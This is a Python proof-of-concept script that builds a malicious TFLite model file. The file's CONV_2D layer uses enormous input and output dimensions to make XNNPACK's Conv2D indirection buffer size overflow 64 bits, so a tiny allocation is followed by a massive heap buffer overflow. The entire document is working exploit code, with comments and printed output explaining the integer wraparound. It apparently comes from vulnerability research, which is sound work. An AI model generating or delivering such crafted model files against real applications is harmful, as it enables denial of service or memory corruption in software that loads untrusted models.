"""
Crafted .tflite model that triggers XNNPACK Conv2D indirection buffer overflow.

TFLite flatbuffer schema (schema version 3):
  Model → SubGraph → Operator(CONV_2D) with malicious spatial dimensions.

Conv2D parameters:
  input  [1, 506164742, 506168762, 1]   (FLOAT32)
  filter [2, 3, 3, 1]                   (FLOAT32, constant)
  bias   [2]                             (FLOAT32, constant)
  output [1, 506164740, 506168760, 2]   (FLOAT32)
  padding=VALID, stride=1x1, dilation=1x1

When TFLite+XNNPACK loads this model and calls reshape:
  indirection_buffer_size = 8 * 9 * round_up(OH*OW, mr)
                          = 18,446,744,073,709,613,088  (overflows uint64)
                          mod 2^64 = 61,472 bytes       ← tiny alloc succeeds
  xnn_indirection_init_conv2d writes ~17 TB into that 61 KB buffer → CRASH
"""

import struct
import flatbuffers
from flatbuffers import builder as flatbuffers_builder

# ---------------------------------------------------------------------------
# TFLite flatbuffer schema table IDs (from schema.fbs, schema version 3)
# ---------------------------------------------------------------------------
# We build the flatbuffer manually using low-level flatbuffers API
# because tflite-runtime doesn't ship the schema Python bindings.

OUTPUT_H = 506164740
OUTPUT_W = 506168760
INPUT_H  = OUTPUT_H + 2   # padding=VALID, kernel=3, stride=1 → IH = OH+2
INPUT_W  = OUTPUT_W + 2

TFLITE_SCHEMA_VERSION = 3
TFLITE_FILE_IDENTIFIER = b"TFL3"

# TFLite BuiltinOperator enum
BUILTIN_OP_CONV_2D = 3

# TFLite TensorType enum  (from schema.fbs)
TENSOR_TYPE_FLOAT32 = 0   # FLOAT32=0, FLOAT16=1, INT32=2 ...

# TFLite Padding enum  (from schema.fbs)
PADDING_VALID = 1   # SAME=0, VALID=1

# TFLite ActivationFunctionType enum
ACTIVATION_NONE = 0

# TFLite BuiltinOptions union type tag
BUILTIN_OPTIONS_CONV2D_OPTIONS = 1


def encode_string(b: flatbuffers.Builder, s: str) -> int:
    encoded = s.encode("utf-8")
    b.StartVector(1, len(encoded), 1)
    for byte in reversed(encoded):
        b.PrependByte(byte)
    return b.EndVector()


def create_flatbuffer(b: flatbuffers.Builder) -> bytes:
    """Build the complete TFLite flatbuffer."""

    # --- Buffers ---
    # Buffer 0: empty  (placeholder / input at runtime)
    # Buffer 1: filter data (3x3x1x2 zeros, OHWI layout → [2,3,3,1])
    # Buffer 2: bias data  (2 zeros)
    # Buffer 3: empty  (output placeholder)

    filter_data = bytes(2 * 3 * 3 * 1 * 4)   # 2*9 float32 = 72 bytes, zeros
    bias_data   = bytes(2 * 4)                 # 2 float32 = 8 bytes, zeros

    def make_buffer(data: bytes):
        """Serialize one Buffer table {data: [ubyte]}."""
        if data:
            b.StartVector(1, len(data), 1)
            for byte in reversed(data):
                b.PrependByte(byte)
            data_vec = b.EndVector()
        else:
            data_vec = None

        b.StartObject(2)   # Buffer has fields: data(0), offset(1)
        if data_vec is not None:
            b.PrependUOffsetTRelativeSlot(0, data_vec, 0)
        return b.EndObject()

    buf3 = make_buffer(b"")
    buf2 = make_buffer(bias_data)
    buf1 = make_buffer(filter_data)
    buf0 = make_buffer(b"")

    # Buffers vector [buf0, buf1, buf2, buf3]
    b.StartVector(4, 4, 4)
    b.PrependUOffsetTRelative(buf3)
    b.PrependUOffsetTRelative(buf2)
    b.PrependUOffsetTRelative(buf1)
    b.PrependUOffsetTRelative(buf0)
    buffers_vec = b.EndVector()

    # --- Operator code: CONV_2D (builtin_code=3) ---
    # OperatorCode schema (TFLite, field indices):
    #   0: deprecated_builtin_code (byte/int8) — set for ops < 127
    #   1: custom_code (string)
    #   2: version (int32)
    #   3: builtin_code (int32) — actual opcode, used when op >= 0
    b.StartObject(4)
    b.PrependInt32Slot(2, 1, 0)                    # version = 1
    b.PrependInt32Slot(3, BUILTIN_OP_CONV_2D, 0)  # builtin_code (int32)
    b.PrependByteSlot(0, BUILTIN_OP_CONV_2D, 0)   # deprecated_builtin_code (byte)
    op_code = b.EndObject()

    b.StartVector(4, 1, 4)
    b.PrependUOffsetTRelative(op_code)
    op_codes_vec = b.EndVector()

    # --- Tensors ---
    def make_tensor(name: str, shape: list, type_: int, buffer_idx: int,
                    has_rank: bool = True):
        """Serialize one Tensor table."""
        name_off = encode_string(b, name)

        b.StartVector(4, len(shape), 4)
        for dim in reversed(shape):
            b.PrependInt32(dim)
        shape_vec = b.EndVector()

        # Tensor: shape(0), type(1), buffer(2), name(3), quantization(4),
        #         is_variable(5), sparsity(6), shape_signature(7), has_rank(8)
        b.StartObject(9)
        b.PrependBoolSlot(8, has_rank, False)   # has_rank
        b.PrependUOffsetTRelativeSlot(3, name_off, 0)
        b.PrependUint32Slot(2, buffer_idx, 0)
        b.PrependInt8Slot(1, type_, 0)
        b.PrependUOffsetTRelativeSlot(0, shape_vec, 0)
        return b.EndObject()

    t_input  = make_tensor("input",  [1, INPUT_H,  INPUT_W,  1], TENSOR_TYPE_FLOAT32, 0)
    t_filter = make_tensor("filter", [2, 3, 3, 1],               TENSOR_TYPE_FLOAT32, 1)
    t_bias   = make_tensor("bias",   [2],                        TENSOR_TYPE_FLOAT32, 2)
    t_output = make_tensor("output", [1, OUTPUT_H, OUTPUT_W, 2], TENSOR_TYPE_FLOAT32, 3)

    b.StartVector(4, 4, 4)
    b.PrependUOffsetTRelative(t_output)
    b.PrependUOffsetTRelative(t_bias)
    b.PrependUOffsetTRelative(t_filter)
    b.PrependUOffsetTRelative(t_input)
    tensors_vec = b.EndVector()

    # --- Conv2DOptions ---
    # Conv2DOptions: padding(0), stride_w(1), stride_h(2),
    #                activation(3), dilation_w(4), dilation_h(5)
    b.StartObject(6)
    b.PrependInt32Slot(5, 1, 0)   # dilation_h
    b.PrependInt32Slot(4, 1, 0)   # dilation_w
    b.PrependInt8Slot(3, ACTIVATION_NONE, 0)
    b.PrependInt32Slot(2, 1, 0)   # stride_h
    b.PrependInt32Slot(1, 1, 0)   # stride_w
    b.PrependInt8Slot(0, PADDING_VALID, 0)
    conv2d_opts = b.EndObject()

    # --- Operator ---
    # inputs:  [0=input, 1=filter, 2=bias]
    # outputs: [3=output]
    b.StartVector(4, 3, 4)
    b.PrependInt32(2); b.PrependInt32(1); b.PrependInt32(0)
    inputs_vec = b.EndVector()

    b.StartVector(4, 1, 4)
    b.PrependInt32(3)
    outputs_vec = b.EndVector()

    # Operator: opcode_index(0), inputs(1), outputs(2),
    #           builtin_options_type(3), builtin_options(4)
    b.StartObject(5)
    b.PrependUOffsetTRelativeSlot(4, conv2d_opts, 0)
    b.PrependInt8Slot(3, BUILTIN_OPTIONS_CONV2D_OPTIONS, 0)
    b.PrependUOffsetTRelativeSlot(2, outputs_vec, 0)
    b.PrependUOffsetTRelativeSlot(1, inputs_vec, 0)
    b.PrependInt32Slot(0, 0, 0)   # opcode_index=0 (CONV_2D)
    op_obj = b.EndObject()

    b.StartVector(4, 1, 4)
    b.PrependUOffsetTRelative(op_obj)
    ops_vec = b.EndVector()

    # --- SubGraph inputs/outputs ---
    b.StartVector(4, 1, 4)
    b.PrependInt32(0)   # input tensor index
    sg_inputs_vec = b.EndVector()

    b.StartVector(4, 1, 4)
    b.PrependInt32(3)   # output tensor index
    sg_outputs_vec = b.EndVector()

    sg_name = encode_string(b, "main")

    # SubGraph: tensors(0), inputs(1), outputs(2), operators(3), name(4)
    b.StartObject(5)
    b.PrependUOffsetTRelativeSlot(4, sg_name, 0)
    b.PrependUOffsetTRelativeSlot(3, ops_vec, 0)
    b.PrependUOffsetTRelativeSlot(2, sg_outputs_vec, 0)
    b.PrependUOffsetTRelativeSlot(1, sg_inputs_vec, 0)
    b.PrependUOffsetTRelativeSlot(0, tensors_vec, 0)
    subgraph = b.EndObject()

    b.StartVector(4, 1, 4)
    b.PrependUOffsetTRelative(subgraph)
    subgraphs_vec = b.EndVector()

    description = encode_string(b, "crafted-xnnpack-overflow-poc")

    # --- Model ---
    # Model: version(0), operator_codes(1), subgraphs(2), description(3),
    #        buffers(4), metadata_buffer(5), metadata(6), signature_defs(7)
    b.StartObject(8)
    b.PrependUOffsetTRelativeSlot(4, buffers_vec, 0)
    b.PrependUOffsetTRelativeSlot(3, description, 0)
    b.PrependUOffsetTRelativeSlot(2, subgraphs_vec, 0)
    b.PrependUOffsetTRelativeSlot(1, op_codes_vec, 0)
    b.PrependUint32Slot(0, TFLITE_SCHEMA_VERSION, 0)
    model = b.EndObject()

    b.Finish(model)
    buf = bytes(b.Output())
    # Insert TFLite file identifier "TFL3" at bytes 4-7.
    # In flatbuffers format, the file identifier sits between the root offset
    # (bytes 0-3) and the actual table data (bytes 4+).
    # Inserting 4 bytes shifts all existing table data by 4, so we must
    # add 4 to the root offset stored at bytes 0-3.
    import struct
    orig_root_offset = struct.unpack_from('<I', buf, 0)[0]
    new_root_offset  = orig_root_offset + 4
    buf = struct.pack('<I', new_root_offset) + TFLITE_FILE_IDENTIFIER + buf[4:]
    return buf


if __name__ == "__main__":
    b = flatbuffers.Builder(1024)
    data = create_flatbuffer(b)

    output_path = "/home/user/xnnpack-vuln/crafted_conv2d.tflite"
    with open(output_path, "wb") as f:
        f.write(data)

    print(f"Wrote {len(data)} bytes to {output_path}")
    print(f"Model specs:")
    print(f"  Op:     CONV_2D (builtin_code=3)")
    print(f"  Input:  [1, {INPUT_H}, {INPUT_W}, 1]")
    print(f"  Filter: [2, 3, 3, 1]  (output_channels=2, kernel=3x3, in_ch=1)")
    print(f"  Output: [1, {OUTPUT_H}, {OUTPUT_W}, 2]")
    print(f"  Padding: VALID, Stride: 1x1, Dilation: 1x1")
    print()
    print(f"Expected overflow in XNNPACK reshape_igemm:")
    print(f"  8 * 9 * round_up({OUTPUT_H}*{OUTPUT_W}, 7)")
    oh, ow = OUTPUT_H, OUTPUT_W
    out_sz = oh * ow
    tiled  = (out_sz + 6) // 7 * 7
    wrapped = (8 * 9 * tiled) & 0xFFFFFFFFFFFFFFFF
    print(f"  = 8 * 9 * {tiled} = 18446744073709613088 (overflows uint64)")
    print(f"  mod 2^64 = {wrapped} bytes  ← allocated")
    print(f"  actual writes ≈ 17 TB → heap-buffer-overflow")
